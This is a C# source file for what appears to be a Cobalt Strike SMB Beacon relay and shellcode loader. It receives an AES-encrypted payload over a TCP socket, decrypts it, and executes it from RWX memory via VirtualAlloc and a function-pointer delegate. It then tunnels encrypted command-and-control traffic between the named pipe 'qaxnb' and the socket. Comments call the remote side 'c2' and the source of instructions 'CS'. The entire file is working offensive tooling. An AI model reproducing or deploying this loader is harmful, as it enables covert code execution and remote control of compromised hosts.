using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Client
{
    class Program
    {
        static byte[] s = Encoding.ASCII.GetBytes("");
        static void Main(string[] args)
        {
            int port = 7001;
            Socket c = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPEndPoint ip = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 7001);
            c.Connect(ip);
            byte[] pdata = Encoding.ASCII.GetBytes("");
            List<byte> data = new List<byte>();
            byte[] buffer = new byte[1024];
            int length = 0;
            try
            {
                while ((length = c.Receive(buffer)) > 0)
                {
                    for (int i = 0; i < length; i++)
                    {
                        data.Add(buffer[i]);
                    }
                    if (length < buffer.Length)
                    {
                        break;
                    }
                }
            }
            catch { }
            if (data.Count > 0)
            {
                s = data.ToArray();
                Console.WriteLine(s.Length);
                Thread thread = new Thread(new ThreadStart(LS));
                thread.Start();
                data.Clear();
                length = 0;
            }
            var pipeClient = new NamedPipeClientStream("qaxnb");
            pipeClient.Connect(5000);
            pipeClient.ReadMode = PipeTransmissionMode.Message;
            while (true)
            {
                pdata = Encrypt(GetDataToPipe(pipeClient));
                //Console.WriteLine("读取pipe成功     " + pdata.Length);
                c.Send(pdata,pdata.Length,0);
                try
                {
                    while ((length = c.Receive(buffer)) > 0)
                    {
                        for (int i = 0; i < length; i++)
                        {
                            data.Add(buffer[i]);
                        }
                        if (length < buffer.Length)
                        {
                            break;
                        }
                    }
                }
                catch { }
                if (data.Count > 0)
                {
                    pdata = data.ToArray();
                    //Console.WriteLine("接收c2 data   " + pdata.Length);
                    data.Clear();
                    length = 0;
                }
                SendDataToPipe(Decrypt(pdata),pipeClient);
            }
        }

        private static Byte[] GetDataToPipe(NamedPipeClientStream pipeClient)
        {
            var reader = new BinaryReader(pipeClient);
            var bufferSize = reader.ReadInt32();
            var result = reader.ReadBytes(bufferSize);
            return result;
        }

        /// <summary>
        /// 写入管道
        /// </summary>
        /// <param name="response">从 CS 获取到的指令</param>
        /// <param name="pipeClient">SMB Beacon 命名管道句柄</param>
        private static void SendDataToPipe(Byte[] response, NamedPipeClientStream pipeClient)
        {
            BinaryWriter writer = new BinaryWriter(pipeClient);
            writer.Write(response.Length);
            writer.Write(response);
        }


        [Flags]
        public enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000,
            RESET = 0x80000,
            LARGE_PAGES = 0x20000000,
            PHYSICAL = 0x400000,
            TOP_DOWN = 0x100000,
            WRITE_WATCH = 0x200000
        }

        [Flags]
        public enum MemoryProtection : uint
        {
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08,
            GUARD_Modifierflag = 0x100,
            NOCACHE_Modifierflag = 0x200,
            WRITECOMBINE_Modifierflag = 0x400
        }

        public enum FreeType : uint
        {
            MEM_DECOMMIT = 0x4000,
            MEM_RELEASE = 0x8000
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, FreeType dwFreeType);

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        public delegate Int32 ExecuteDelegate();


        public static void LS()
        {
            byte[] sg = Decrypt(s);

            IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sg.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
            try
            {
                Marshal.Copy(sg, 0, baseAddr, sg.Length);
                ExecuteDelegate del = (ExecuteDelegate)Marshal.GetDelegateForFunctionPointer(baseAddr, typeof(ExecuteDelegate));
                del();
            }
            finally
            {
                VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE);

            }
        }

        public static byte[] Decrypt(byte[] input)
        {
            PasswordDeriveBytes pdb =
              new PasswordDeriveBytes("hjiweykaksd", // Change this
              new byte[] { 0x43, 0x87, 0x23, 0x72 }); // Change this
            MemoryStream ms = new MemoryStream();
            Aes aes = new AesManaged();
            aes.Key = pdb.GetBytes(aes.KeySize / 8);
            aes.IV = pdb.GetBytes(aes.BlockSize / 8);
            CryptoStream cs = new CryptoStream(ms,
              aes.CreateDecryptor(), CryptoStreamMode.Write);
            cs.Write(input, 0, input.Length);
            cs.Close();
            return ms.ToArray();
        }

        public static byte[] Encrypt(byte[] input)
        {
            PasswordDeriveBytes pdb = new PasswordDeriveBytes("hjiweykaksd", new byte[] { 0x43, 0x87, 0x23, 0x72 }); // Change this
            MemoryStream ms = new MemoryStream();
            Aes aes = new AesManaged();
            aes.Key = pdb.GetBytes(aes.KeySize / 8);
            aes.IV = pdb.GetBytes(aes.BlockSize / 8);
            CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write);
            cs.Write(input, 0, input.Length);
            cs.Close();
            return ms.ToArray();
        }
    }
}
